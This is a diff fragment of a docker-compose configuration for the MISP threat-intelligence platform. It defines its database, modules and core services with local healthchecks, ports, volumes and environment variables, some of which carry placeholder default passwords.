+      - mysql_data:/var/lib/mysql
+    cap_add:
+      - SYS_NICE
+    healthcheck:
+      test: mysqladmin --user=$$MYSQL_USER --password=$$MYSQL_PASSWORD status
+      interval: 2s
+      timeout: 1s
+      retries: 3
+      start_period: 60s
+      start_interval: 5s
+
+  misp-modules:
+    image: ghcr.io/misp/misp-docker/misp-modules:latest
+    restart: always
+    healthcheck:
+      test: "/bin/bash -c '</dev/tcp/localhost/6666'"
+      interval: 2s
+      timeout: 1s
+      retries: 3
+      start_period: 60s
+      start_interval: 10s
+    environment:
+      - "TZ=${TZ:-UTC}"
+
+  misp-core:
+    image: ghcr.io/misp/misp-docker/misp-core:latest
+    restart: always
+    cap_add:
+      - AUDIT_WRITE
+    depends_on:
+      redis:
+        condition: service_healthy
+      db:
+        condition: service_healthy
+      misp-modules:
+        condition: service_healthy
+    healthcheck:
+      test: curl -ks ${BASE_URL:-https://localhost}/users/heartbeat > /dev/null || exit 1
+      interval: 2s
+      timeout: 1s
+      retries: 3
+      start_period: 180s
+      start_interval: 30s
+    ports:
+      - "${CORE_HTTP_PORT:-8080}:80"
+      - "${CORE_HTTPS_PORT:-8443}:443"
+    volumes:
+      - misp_configs:/var/www/MISP/app/Config/
+      - misp_logs:/var/www/MISP/app/tmp/logs/
+      - misp_files:/var/www/MISP/app/files/
+      - misp_ssl:/etc/nginx/certs/
+      - misp_gnupg:/var/www/MISP/.gnupg/
+    environment:
+      - "BASE_URL=${BASE_URL}"
+      - "CRON_USER_ID=${CRON_USER_ID:-1}"
+      - "DISABLE_IPV6=${DISABLE_IPV6:-true}"
+      - "ENABLE_DB_SETTINGS=${ENABLE_DB_SETTINGS:-false}"
+      - "ADMIN_EMAIL=${ADMIN_EMAIL}"
+      - "ADMIN_PASSWORD=${ADMIN_PASSWORD}"
+      - "ADMIN_KEY=${ADMIN_KEY}"
+      - "ADMIN_ORG=${ADMIN_ORG}"
+      - "GPG_PASSPHRASE=${GPG_PASSPHRASE}"
+      - "TZ=${TZ:-UTC}"
+      - "MYSQL_HOST=${MYSQL_HOST:-db}"
+      - "MYSQL_PORT=${MYSQL_PORT:-3306}"
+      - "MYSQL_USER=${MYSQL_USER:-misp}"
+      - "MYSQL_PASSWORD=${MYSQL_PASSWORD:-example}"
+      - "MYSQL_DATABASE=${MYSQL_DATABASE:-misp}"
+      - "REDIS_HOST=${REDIS_HOST:-redis}"
+      - "REDIS_PORT=${REDIS_PORT:-6379}"
+      - "REDIS_PASSWORD=${REDIS_PASSWORD:-redispassword}"
+      - "ENABLE_REDIS_EMPTY_PASSWORD=${ENABLE_REDIS_EMPTY_PASSWORD:-false}"
       - "SMTP_FQDN=${SMTP_FQDN:-mail}"
       - "SMTP_PORT=${SMTP_PORT:-25}"
 
@@ -2860,4 +2279,3 @@ volumes:
   misp_files:
   misp_ssl:
   misp_gnupg:
-
